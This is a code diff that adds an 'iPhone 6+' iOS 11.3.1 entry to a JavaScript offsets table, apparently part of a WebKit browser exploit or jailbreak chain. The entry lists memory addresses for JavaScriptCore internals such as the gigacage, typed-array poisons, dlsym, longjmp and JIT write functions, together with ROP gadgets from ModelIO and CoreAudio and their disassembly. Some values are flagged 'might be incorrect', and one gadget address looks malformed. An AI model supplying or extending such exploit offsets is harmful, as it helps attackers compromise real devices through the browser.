@@ -50,6 +50,36 @@ var Offsets = function Offsets(sw_vers, productname) {
         linkcode_gadget: 0  //See jitcode.s (stage 2)
     };
     
+    
+    offsets["iPhone 6+"][11.31] = {
+        padding: 0x18, //For JIT Hardening
+        vtable: 0, //From JSCore
+        disableprimitivegigacage: 0x18851a7d4,
+        callbacks: 0x1b3247d28, //From JSCore (might be incorrect)
+        g_gigacagebaseptrs: 0x1b1bf4000, //From JSCore
+        g_typedarraypoisons: 0x1b31a1720, //From JSCore
+        longjmp: 0x180b12778, //From JSCore (might be incorrect)
+        dlsym: 0x18084ef90,  //From JSCore
+        startfixedmempool: 0x1b31a10b8, //From JSCore
+        endfixedmempool: 0x1b31a10c0, //From JSCore
+        jit_writeseperateheaps_func: 0x1b31a10c8, //From JSCore
+        usefastpermissions_jitcopy: 0x1b1bf0018, //From JSCore (JIT hardening)
+        ptr_stack_check_guard: 0x1b30f9ef8, //From JSCore
+        modelio_popx8: 0xffffffffff9e8000, //From ModelIO
+                                    //   ldr x8, [sp, #0x28]
+                                    //   ldr x0, [x8, #0x18]
+                                    //   ldp x29, x30, [sp, #0x50]
+                                    //   add sp, sp, #0x60
+                                    //   ret
+        coreaudio_popx2: 0x183fc1000,   //From CoreAudio
+                                        //   ldr x2, [sp, #8]
+                                        //   mov x0, x2
+                                        //   ldp x29, x30, [sp, #0x10]
+                                        //   add sp, sp, #0x20
+                                        //   ret
+        linkcode_gadget: 0  //See jitcode.s (stage 2)
+    };
+    
     offsets["iPhone 8"][11.31] = {
         padding: 0x20, //For JIT Hardening
         vtable: 0x189c9a808, //From Webkit
